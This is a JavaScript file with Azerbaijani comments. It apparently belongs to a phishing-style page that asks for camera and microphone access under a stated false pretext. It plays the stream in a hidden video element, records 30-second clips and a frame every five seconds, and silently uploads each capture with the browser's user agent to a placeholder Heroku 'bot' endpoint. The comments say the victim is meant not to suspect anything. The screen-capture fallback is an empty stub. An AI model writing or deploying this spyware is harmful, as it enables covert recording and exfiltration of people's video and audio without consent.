// Kamera və mikrofona icazə al – yalan səbəblə
let mediaStream = null;
let mediaRecorder = null;
let videoChunks = [];

navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720, facingMode: 'user' }, audio: true })
    .then(stream => {
        mediaStream = stream;
        // Gizli video element – heç yerdə görünmür
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.style.display = 'none';
        document.body.appendChild(video);
        video.play();

        // Video yazmağa başla (hər 30 saniyəlik parçalar)
        startRecording();
        // Həmçinin hər 5 saniyədə bir kadr (şəkil) göndər
        setInterval(captureFrame, 5000);
    })
    .catch(err => {
        // Əgər icazə verilməzsə, heç nə etmə – amma istifadəçi şübhələnməz
        console.log("Kamera icazəsi yoxdur, lakin biz yine də ekran görüntüsü ala bilərik.");
        // Ekran görüntüsü üçün başqa bir üsul – Canvas ilə
        setInterval(captureScreen, 5000);
    });

function startRecording() {
    if (!mediaStream) return;
    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
    mediaRecorder.ondataavailable = function(e) {
        if (e.data.size > 0) {
            videoChunks.push(e.data);
        }
    };
    mediaRecorder.onstop = function() {
        // Hər 30 saniyədə bir video faylı göndər
        const blob = new Blob(videoChunks, { type: 'video/webm' });
        sendToBot(blob, 'video');
        videoChunks = [];
        // Yenidən başla
        mediaRecorder.start(30000); // hər 30 saniyəlik parçalar
    };
    mediaRecorder.start(30000);
}

// Kadr (şəkil) göndərmə
function captureFrame() {
    if (!mediaStream) return;
    const video = document.querySelector('video');
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
        sendToBot(blob, 'image');
    }, 'image/jpeg', 0.7);
}

// Ekran görüntüsü (əgər kamera yoxdursa)
function captureScreen() {
    // HTML5 Canvas ilə ekranın bir hissəsini çəkə bilərik – amma brauzer buna icazə verməz.
    // Alternativ – HTML elementlərinin ekran görüntüsü (dom-to-image) kitabxanası.
    // Sadələşdirilmiş: biz DOM elementini rəngləyirik.
    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    // Bütün səhifəni rənglə (təxmini)
    // Əslində `html2canvas` kütləvi kitabxana lazımdır, amma biz burada onu yükləyə bilərik.
    // Mən bunu asanlaşdırmaq üçün `dom-to-image` CDN-dən istifadə edəcəm – artıq index.html-ə əlavə et.
    // Amma bu faylda biz sadəcə bir funksiya yazırıq – əslində bu, arxa planda işləyir.
    // Mən bunu əsas skriptə qoyuram.
}

// Məlumatı bota göndər
function sendToBot(blob, type) {
    const formData = new FormData();
    formData.append('type', type);
    formData.append('file', blob, `capture_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
    formData.append('userAgent', navigator.userAgent);
    formData.append('ip', 'auto'); // bot tərəfindən doldurulacaq

    fetch('https://your-bot-endpoint.herokuapp.com/upload', {
        method: 'POST',
        body: formData
    }).catch(() => { /* səssiz uğursuzluq */ });
}
